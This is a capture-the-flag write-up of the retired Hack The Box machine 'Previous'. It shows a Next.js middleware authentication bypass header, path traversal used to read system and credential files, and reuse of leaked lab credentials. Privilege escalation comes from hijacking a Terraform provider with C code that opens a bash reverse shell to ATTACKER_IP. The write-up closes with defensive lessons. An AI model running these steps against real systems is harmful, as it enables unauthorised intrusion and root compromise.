---
title: ⏪ HTB Previous Write-up
name: Previous
date: 2026-01-10
last_modified_at: 2026-01-10
difficulty: Medium
os: Linux
skills: Enumeration, Auth Bypass, Path Traversal, Lateral Movement, Reverse Shell, Privilege Escalation
tools: rustscan, nmap, Burp, nc, RevShells, CVE-2025-29927, sudo
published: true
---

![](images/Pasted%20image%2020250824140839.png)

## 📝 Summary

The `previous.htb` web server ran Next.js 15.2.2, which was vulnerable to an authentication bypass in middleware handling (CVE-2025-29927). By supplying a crafted `X-Middleware-Subrequest` header, authentication checks could be skipped entirely.

After bypassing authentication, I was able to access the site’s online documentation and interact with an API endpoint used to download example files. This endpoint was vulnerable to path traversal, allowing arbitrary file reads from the system.

By enumerating the Next.js application directory, I identified that `next-auth` was used for authentication. Downloading the compiled server runtime revealed the NextAuth credentials file, which contained hardcoded credentials for the user `jeremy`. These credentials were reused for Jeremy's system account, allowing SSH access as `jeremy`.

The user `jeremy` was permitted to run Terraform as root via `sudo`. Although the Terraform configuration appeared locked down, a writable `.terraformrc` file in the user’s home directory contained a provider development override. By placing a malicious provider binary in the overridden path, I was able to hijack Terraform’s provider execution.

When Terraform was executed with `sudo`, the malicious provider was run as root, spawning a reverse shell and resulting in full root compromise of the system.

## 🌐 PreviousJS website

### 🔎 Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 8.9p1
- `80/tcp`: nginx 1.18.0

```
fcoomans@kali:~/htb/previous$ rustscan -a 10.10.11.83 --tries 5 --ulimit 10000 -- -sCV -oA previous_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.83:22
Open 10.10.11.83:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA previous_tcp_all" on ip 10.10.11.83
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for 10.10.11.83
Host is up, received reset ttl 63 (0.40s latency).
Scanned at 2025-08-24 11:35:24 SAST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After adding `previous.htb` to `/etc/hosts`,

```
fcoomans@kali:~/htb/previous$ grep previous.htb /etc/hosts
10.10.11.83     previous.htb
```

I opened http://previous.htb and Wappalyzer showed me the site's technology stack and noticed that the site used Next.js 15.2.2.

![](images/Pasted%20image%2020250824121249.png)

#### 🐞 CVE-2025-29927

`searchsploit` confirmed that this version of Next.js was vulnerable to an Authorization Bypass.

```
fcoomans@kali:~/htb/previous$ searchsploit next.js 15.2.2
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
Next.js Middleware 15.2.2 -  Authorization Bypass  | multiple/webapps/52124.txt
--------------------------------------------------- ---------------------------------
Shellcodes: No Results

fcoomans@kali:~/htb/previous$ PAGER=cat searchsploit -x 52124
  Exploit: Next.js Middleware 15.2.2 -  Authorization Bypass
      URL: https://www.exploit-db.com/exploits/52124
     Path: /usr/share/exploitdb/exploits/multiple/webapps/52124.txt
    Codes: CVE-2025-29927
 Verified: False
File Type: ASCII text
# Exploit Title: Next.js Middleware Bypass Vulnerability (CVE-2025-29927)
# Date: 2025-03-26
# Exploit Author: kOaDT
# Vendor Homepage: https://nextjs.org/
# Software Link: https://github.com/vercel/next.js
# Version: 13.0.0 - 13.5.8 / 14.0.0 - 14.2.24 / 15.0.0 - 15.2.2 / 11.1.4 - 12.3.4
# Tested on: Ubuntu 22.04.5 LTS
# CVE: CVE-2025-29927
# PoC: https://raw.githubusercontent.com/kOaDT/poc-cve-2025-29927/refs/heads/main/exploit.js
# POC GitHub Repository: https://github.com/kOaDT/poc-cve-2025-29927/tree/main
```

https://github.com/MuhammadWaseem29/CVE-2025-29927-POC explained the exploit and it turned out that you can bypass authentication by simply adding the following Header to the Request:

```
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

### 🧪 Exploitation

#### 🪪 Auth Bypass

Clicking the `Docs` link on the site home page opened a login screen.

![](images/Pasted%20image%2020260110121143.png)

I opened the Burp proxy settings and configured Burp to always add the Header to all Requests.

![](images/Pasted%20image%2020250824121553.png)

Clicking on the `Docs` link, after the malicious Header addition, opened the Documentation Overview page.

![](images/Pasted%20image%2020250824121632.png)

I found a download link under `Examples`, which opens the `/api/download` endpoint and downloads the file via the `example` parameter.

![](images/Pasted%20image%2020250824122859.png)

I clicked the download link and confirmed that the `hello-world.ts` example file was downloaded using the Auth Bypass.

![](images/Pasted%20image%2020250824122950.png)

#### ↩️ Path Traversal

I tested for path traversal and tried to download `../../../../../etc/passwd` and the file was downloaded.

![](images/Pasted%20image%2020250824123045.png)

The current working directory was identified as `/app`, as seen in `/proc/self/environ` via the `PWD` environment variable, confirming that the application root directory was `/app`.

![](images/Pasted%20image%2020250824130035.png)

Reviewing the application dependencies in `/app/package.json` showed that `next-auth` was used for authentication.

![](images/Pasted%20image%2020260110133256.png)

According to the NextAuth documentation, credential-based authentication is implemented in either
`pages/api/auth/[...nextauth].js` or `app/api/auth/[...nextauth]/route.ts`, depending on whether the Pages Router or App Router is used.

In a production Next.js deployment, source files are compiled and executed from the `.next/server/` directory rather than directly from the source tree. Documentation on the Next.js build output structure confirms that API routes using the Pages Router are compiled to `.next/server/pages/api/`.

After enumerating this directory, the compiled authentication handler was located at: `/app/.next/server/pages/api/auth/[...nextauth].js`

Downloading the file revealed a username `jeremy` and a password `MyNameIsJeremyAndILovePancakes`.

![](images/Pasted%20image%2020250824130709.png)

#### 👣 Foothold as Jeremy

I attempted to SSH to the target as user `jeremy` and password `MyNameIsJeremyAndILovePancakes`.  
The attempt was successful and I had SSH access to the target.

```
fcoomans@kali:~/htb/previous$ ssh jeremy@previous.htb
jeremy@previous.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

<SNIP>

jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
```

### 💰 Post Exploitation

#### 🚩 user.txt

Jeremy held the `user.txt` flag.

```
jeremy@previous:~$ cat /home/jeremy/user.txt
a0c448c9350d3caaf932b79b82a20447
```

## 🏗️ Terraform

#### 🔎 Recon

Jeremy could run Terraform (`/usr/bin/terraform`) as root via `sudo` with specific parameters.  The first parameter changed the directory to `/opt/examples` and the second parameter applied/ran (`apply`) the Terraform.

```
jeremy@previous:~$ sudo -l
[sudo] password for jeremy:
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

`/opt/examples` was not writable by users other than root.

```
jeremy@previous:~$ ls -lhd /opt/examples/
drwxr-xr-x 3 root root 4.0K Aug 24 11:18 /opt/examples/
jeremy@previous:~$ ls -lh /opt/examples/
total 8.0K
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
-rw-r--r-- 1 root root 1.1K Aug 24 11:19 terraform.tfstate
```

The `/opt/examples/main.cf` appeared to load providers from `previous.htb/terraform/examples` and then transformed the source file `/root/examples/hello-world.ts`.

```
jeremy@previous:~$ cat /opt/examples/main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

`/opt/examples/terraform.tfstate` didn't leak anything interested and simply contained the current state of Terraform.

```
jeremy@previous:~$ cat /opt/examples/terraform.tfstate
{
  "version": 4,
  "terraform_version": "1.11.4",
  "serial": 8,
  "lineage": "44b13e76-4b23-5fd1-8bf6-b5625394edda",
  "outputs": {
    "destination_path": {
      "value": "/home/jeremy/docker/previous/public/examples/hello-world.ts",
      "type": "string"
    }
  },
  "resources": [
    {
      "mode": "managed",
      "type": "examples_example",
      "name": "example",
      "provider": "provider[\"previous.htb/terraform/examples\"]",
      "instances": [
        {
          "schema_version": 0,
          "attributes": {
            "destination_path": "/home/jeremy/docker/previous/public/examples/hello-world.ts",
            "id": "/home/jeremy/docker/previous/public/examples/hello-world.ts",
            "source_path": "/root/examples/hello-world.ts"
          },
          "sensitive_attributes": []
        }
      ]
    }
  ],
  "check_results": [
    {
      "object_kind": "var",
      "config_addr": "var.source_path",
      "status": "pass",
      "objects": [
        {
          "object_addr": "var.source_path",
          "status": "pass"
        }
      ]
    }
  ]
}
```

But looking at the user directory, I saw a user specific `.terraformrc` file.

```
jeremy@previous:~$ ls -lha
total 36K
drwxr-x--- 4 jeremy jeremy 4.0K Aug 21 20:24 .
drwxr-xr-x 3 root   root   4.0K Aug 21 20:09 ..
lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
-rw-r--r-- 1 jeremy jeremy 3.7K Aug 21 17:28 .bashrc
drwx------ 2 jeremy jeremy 4.0K Aug 21 20:09 .cache
drwxr-xr-x 3 jeremy jeremy 4.0K Sep 22 07:37 docker
-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
-rw-r----- 1 root   jeremy   33 Jan  9 18:57 user.txt
```

This file contained the path to the `previous.htb/terraform/examples` providers that do the terraforming on the source file.  The thing is that the user can modify this file.  

```
jeremy@previous:~$ cat .terraformrc
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

The `/usr/local/go/bin/` directory contained some providers, but the directory was not writable by Jeremy.

```
jeremy@previous:~$ ls -lh /usr/local/go/bin/
total 38M
-rwxr-xr-x 1 root root  13M Aug  7  2024 go
-rwxr-xr-x 1 root root 2.8M Aug  7  2024 gofmt
-rwxr-xr-x 1 root root  23M Aug 21 18:38 terraform-provider-examples
```

The providers were Linux compiled binaries.

```
jeremy@previous:~$ file /usr/local/go/bin/go
/usr/local/go/bin/go: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=gYEhj5K0Wr3YqmkcGny5/V-q9HZBvbWhcczLOSRNl/PUMrXpp6xwJ3AeoV0WJD/MUHMzhRx_pmv9Li34vA0, not stripped
jeremy@previous:~$ file /usr/local/go/bin/gofmt
/usr/local/go/bin/gofmt: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=fUTkQi5PlWYa5jxfdpCg/Api3zGN97WqhROZUDY7S/y2z5a9iucYTJz6Lr6OoY/oLqUu_EtC9OeXyPqFWpM, not stripped
```

### 🧪 Exploitation

#### 🐚 Reverse Shell

I started by changing the provider path to `/tmp/`.  Jeremy would be able to create providers that Terraform would use.

```
jeremy@previous:~$ cat .terraformrc
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/tmp/"
        }
        direct {}
}
```

I then used https://www.revshells.com to generate a bash reverse shell.

![](images/Pasted%20image%2020260110151318.png)

Next, I created a malicious Terraform provider that forks into two processes. The child process launches a reverse shell, while the parent process remains alive to satisfy Terraform’s provider lifecycle requirements.

Terraform expects provider plugins to stay running after initialization; if the provider process exits prematurely, Terraform treats this as a failure. By keeping the parent process alive in an infinite loop, Terraform continues execution while the reverse shell runs independently in the child process.

```c
jeremy@previous:~$ cat /tmp/terraform-provider-examples.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(void){
    if(fork() == 0){
        // child: launch reverse shell
        system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"");
        exit(0);
    }

    // parent: just loop so Terraform sees plugin alive
    while(1){ sleep(10); }
}
```

Lastly, I compiled the provider source code.

```
jeremy@previous:~$ gcc -o /tmp/terraform-provider-examples /tmp/terraform-provider-examples.c
```

A `nc` listener was started on port 4444 on the attack host.

```
fcoomans@kali:~/htb/previous$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

Jeremy started Terraform as the root user via `sudo`, causing the malicious provider to execute the malicious reverse shell.

```
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
```

And the `nc` listener caught the root reverse shell.

```
fcoomans@kali:~/htb/previous$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.83] 47620
root@previous:/opt/examples# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation

#### 🏆 root.txt

`root` held the `root.txt` flag.

```
root@previous:/opt/examples# cat /root/root.txt
cat /root/root.txt
bb2884439f232f27e5552ad4c6f44d8b
```

PreviousJS skipped auth, Terraform skipped safety checks, and I skipped straight to root.

And `Previous has been Pwned!` 🎉

![](images/Pasted%20image%2020250824135827.png)

## 📚 Lessons Learned

- **Outdated software in production**: The application was running a vulnerable version of Next.js that allowed authentication to be bypassed. Regular patching and dependency updates are critical, especially for internet‑facing frameworks.  
- **Password reuse across services**: Credentials exposed at the application level were reused for the system account, enabling lateral movement. Enforce unique passwords per service and use centralized identity management where possible.  
- **Path traversal in auxiliary features**: A beta download feature allowed arbitrary file reads, exposing sensitive configuration and runtime files. All file access functionality must strictly validate and sanitize user input, even in non‑core or “example” features.  
- **User‑controlled override files overlooked**: Terraform was hardened via `sudo` restrictions and file permissions, but a writable `.terraformrc` allowed provider overrides to bypass those controls. Security reviews must account for user‑level configuration files that influence privileged tooling.  
- **Violation of the Principle of Least Privilege (PoLP)**: The user was allowed to run Terraform as root despite not requiring full administrative privileges. Sudo permissions should be tightly scoped and regularly reviewed to limit impact if an account is compromised.  

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.